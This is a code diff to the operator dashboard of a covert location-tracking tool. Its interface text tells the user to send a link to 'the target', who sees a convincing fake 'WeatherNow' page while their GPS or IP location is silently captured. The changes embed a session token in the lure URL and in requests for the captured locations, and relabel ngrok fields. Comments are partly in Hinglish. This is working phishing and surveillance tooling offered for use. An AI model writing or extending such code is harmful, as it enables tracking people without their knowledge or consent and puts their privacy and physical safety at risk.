@@ -916,7 +916,7 @@ textarea:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,245,255,.1
 
   <div class="fl-top">
     <div class="panel">
-      <div class="slbl">▸ LIVE TRACKING LINK</div>
+      <div class="slbl">▸ NGROK TRACKING LINK</div>
       <p style="color:var(--dim);font-size:.84rem;line-height:1.7;margin-bottom:.8rem">Copy this link and send it to the target. When opened, they will see a convincing WeatherNow page and their location will be silently captured.</p>
       <div class="nbox" id="nbox">
         <span id="ntxt">Start server.py first...</span>
@@ -934,7 +934,7 @@ textarea:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(0,245,255,.1
       </div>
       <div class="rp" style="margin-top:.5rem">
         <div class="rr"><span class="rk">SERVER</span><span class="rv" id="fl-srv">—</span></div>
-        <div class="rr"><span class="rk">BACKEND</span><span class="rv" id="fl-ngrok">—</span></div>
+        <div class="rr"><span class="rk">NGROK</span><span class="rv" id="fl-ngrok">—</span></div>
         <div class="rr"><span class="rk">FAKE PAGE</span><span class="rv g">WeatherNow</span></div>
         <div class="rr"><span class="rk">METHOD</span><span class="rv">GPS → IP fallback</span></div>
         <div class="rr"><span class="rk">AUTO REFRESH</span><span class="rv g">Every 5s</span></div>
@@ -1096,6 +1096,18 @@ var mainMap=null, ipMap=null, capMap=null;
 var mainM=null, ipM=null, capMs=[];
 var online=false, ngrokUrl=null;
 var sg=0, so=0, lastCap=0, capTimer=null;
+var SESSION_TOKEN = null;  // private token — sirf is browser ko pata hai
+
+/* ── SESSION INIT ──────────────────── */
+function initSession() {
+  fetch(SRV + '/api/session')
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      SESSION_TOKEN = d.token;
+      // Weather link mein token embed karo
+      fetchNgrok();
+    }).catch(function(){});
+}
 
 /* ── TOAST ─────────────────────────── */
 function toast(msg, err) {
@@ -1140,7 +1152,8 @@ function checkSrv() {
         document.getElementById('my-isp').textContent = d.isp || '—';
         document.getElementById('my-city').textContent= d.city|| '—';
       }
-      fetchNgrok();
+      // Session pehli baar banao
+      if (!SESSION_TOKEN) { initSession(); } else { fetchNgrok(); }
     })
     .catch(function(){
       online = false;
@@ -1154,9 +1167,10 @@ function checkSrv() {
 }
 
 function fetchNgrok() {
-  // Render pe ngrok nahi chalta — SRV (Render URL) seedha use karo
+  // Token weather URL mein embed karo — sirf tumhara data tumhe dikhega
   ngrokUrl = SRV;
-  document.getElementById('ntxt').textContent = SRV + '/weather';
+  var weatherUrl = SRV + '/weather' + (SESSION_TOKEN ? '?t=' + SESSION_TOKEN : '');
+  document.getElementById('ntxt').textContent = weatherUrl;
   document.getElementById('sngrok').textContent = 'LINK: ACTIVE';
   document.getElementById('fl-ngrok').textContent = '✓ LIVE';
   var fn = document.getElementById('ftr-ngrok');
@@ -1476,12 +1490,12 @@ document.getElementById('gps-btn').addEventListener('click', function(){
 
 /* ── FAKE LINK BUTTONS ─────────────── */
 document.getElementById('ref-ngrok').addEventListener('click', function(){
-  fetchNgrok(); toast('🔄 Link refreshed!');
+  fetchNgrok(); toast('🔄 Ngrok URL refresh...');
 });
 
 document.getElementById('copy-ngrok').addEventListener('click', function(){
   var t = document.getElementById('ntxt').textContent;
-  if (!t || t === '—') { toast('⚠ Link not ready yet!', true); return; }
+  if (t.includes('server.py')) { toast('⚠ Please start server.py first!', true); return; }
   cpText(t);
 });
 
@@ -1512,7 +1526,7 @@ function cpText(t) {
 /* ── LOAD CAPTURES ─────────────────── */
 function loadCaps() {
   if (!online) return;
-  fetch(SRV + '/api/captures')
+  fetch(SRV + '/api/captures?token=' + (SESSION_TOKEN || ''))
     .then(function(r){ return r.json(); })
     .then(function(data){
       document.getElementById('sc').textContent = data.length;
